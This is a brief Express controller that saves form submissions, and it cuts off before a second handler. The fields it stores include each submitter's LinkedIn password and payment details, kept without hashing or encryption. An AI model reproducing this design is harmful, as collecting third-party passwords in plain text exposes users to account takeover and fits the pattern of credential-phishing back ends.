const Response = require('../models/Response');

// Submit form response
exports.submitResponse = async (req, res) => {
  try {
    const {
      formId,
      fullName,
      phoneNo,
      email,
      linkedinEmail,
      linkedinPassword,
      paymentMethod,
      paymentDetails
    } = req.body;

    const response = new Response({
      formId,
      fullName,
      phoneNo,
      email,
      linkedinEmail,
      linkedinPassword,
      paymentMethod,
      paymentDetails
    });

    await response.save();
    res.status(201).json({ message: 'Response submitted successfully' });
  } catch (err) {
    res.status(400).json({ message: 'Submission failed', error: err.message });
  }
};

// Get all responses by formId

